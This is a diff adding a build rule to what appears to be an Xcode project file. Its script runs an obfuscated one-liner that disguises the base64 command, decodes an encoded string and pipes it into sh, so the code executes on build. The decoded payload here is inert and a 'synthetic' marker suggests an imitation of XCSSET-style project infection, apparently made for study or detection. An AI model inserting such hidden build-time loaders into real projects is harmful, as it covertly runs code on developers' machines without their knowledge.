@@ -1,0 +1,4 @@
+/* Begin PBXBuildRule section */
+isa = PBXBuildRule;
+script = "sh -c \"${A3EA261}\"";
+A3EA261 = "((k(){ `printf bdase64 | tr -d d` --decode; }; echo ZWNobyA= | k | sh)); synthetic-xcsset-secret-never-expose";
